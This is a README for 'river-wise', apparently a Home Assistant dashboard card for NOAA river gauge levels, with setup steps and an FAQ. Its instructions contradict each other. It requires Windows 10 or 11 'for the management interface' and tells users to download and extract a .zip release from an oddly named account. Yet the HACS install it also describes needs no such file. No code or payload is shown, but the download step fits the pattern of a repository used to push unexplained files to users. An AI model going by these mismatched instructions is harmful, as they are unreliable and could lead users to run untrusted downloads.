# 🌊 river-wise - Track local river levels with ease

[![Download river-wise](https://img.shields.io/badge/Download-Release-blue)](https://github.com/saundersinviolate211/river-wise/releases)

river-wise brings real-time water data into your Home Assistant dashboard. It monitors river stage, flow, and flood forecasts from the NOAA NWPS API. You see live hydrographs, flood warnings, and safety information for any specific gauge ID.

## 🛠️ System Requirements

Ensure your system meets these needs to run the software:

* Home Assistant instance installed and active.
* HACS (Home Assistant Community Store) installed.
* Stable internet connection.
* Windows 10 or 11 for the management interface.
* Basic knowledge of your Home Assistant dashboard layout.

## 📥 Downloading the Software

You must download the latest release files to begin the setup. 

[Visit this page to download the latest version](https://github.com/saundersinviolate211/river-wise/releases).

1. Open the link above in your web browser.
2. Look for the section labeled "Assets" at the bottom of the top release announcement.
3. Click the file ending in `.zip` to start the download.
4. Save the folder to a location you can find, such as your Desktop or Downloads folder.
5. Right-click the downloaded file and select "Extract All" to see the contents.

## ⚙️ Setting Up river-wise

Installation follows these steps when you use HACS.

1. Open your Home Assistant dashboard.
2. Select "HACS" from the side menu.
3. Click the "Frontend" tab.
4. Click the three dots in the top right corner.
5. Select "Custom repositories."
6. Paste the URL of this repository into the repository field.
7. Select "Lovelace" as the category.
8. Click "Add."
9. Find "river-wise" in your list and click "Download."
10. Restart Home Assistant to finalize the installation.

## 📊 Using Your Dashboard Card

Once you finish the setup, you add the card to your dashboard.

1. Go to your Home Assistant dashboard.
2. Click the three dots in the top right corner and select "Edit Dashboard."
3. Click the "+" button to add a new card.
4. Search for "river-wise" in the card list.
5. Select the card type.
6. Enter the "Gauge ID" for your local river. 
7. You find your specific Gauge ID on the official NOAA NWPS website.
8. Save the card to view the hydrograph and stage data.

## 📈 Understanding the Data

The card displays several metrics to help you understand river conditions.

* Real-time Stage: The current height of the water at the sensor.
* Flow Rate: The volume of water moving past the gauge.
* Forecast Line: The dotted path shows projected water levels over the next 24 to 48 hours.
* Flood Thresholds: Horizontal bars show action, minor, moderate, and major flood levels.
* Impact Statements: Text below the chart describes what happens at your current water level.

## 🔧 Managing Settings

You configure the card through the "Edit" menu on your dashboard. You can adjust the following settings:

* Refresh Interval: How often the data updates.
* Color Themes: Choose between light or dark mode.
* Hide/Show Thresholds: Toggle the flood lines on or off.
* Custom Labels: Rename the sensor to match your local river name.

## 💡 Frequent Questions

Why does my gauge show no data?
Check your Gauge ID. An incorrect ID prevents the system from fetching data from the NOAA server. Ensure your Home Assistant can reach the internet.

Can I track multiple rivers?
Yes. Add a new instance of the river-wise card for every gauge you want to monitor.

How often does the data sync?
The card requests new information from the NOAA API every 15 minutes. This balances current info with server safety.

What do the colors on the graph mean?
The lines indicate different risk levels. Blue is normal state, yellow is action state, orange is minor flood, and red is major flood.

Where do I find my Gauge ID?
Visit the NOAA NWPS website, type your city or river name into the search bar, and select your station. The five-character code in the URL is your Gauge ID.

## 🤝 Getting Help

If you encounter issues, verify your internet connection first. Ensure your Home Assistant version is up to date. Most errors result from a misconfigured Gauge ID. 

Check the following steps if the card refuses to load:

1. Clear your browser cache.
2. Reload the UI by pressing F5.
3. Check the Home Assistant log files for any error messages related to river-wise.
4. Ensure your Home Assistant system allows external API requests.

The software functions by pulling data directly from public NOAA servers. It requires no API key to operate. Keep the software updated through HACS to receive the latest features and safety patches. Maintain your monitoring setup by checking the gauge status after extreme weather events.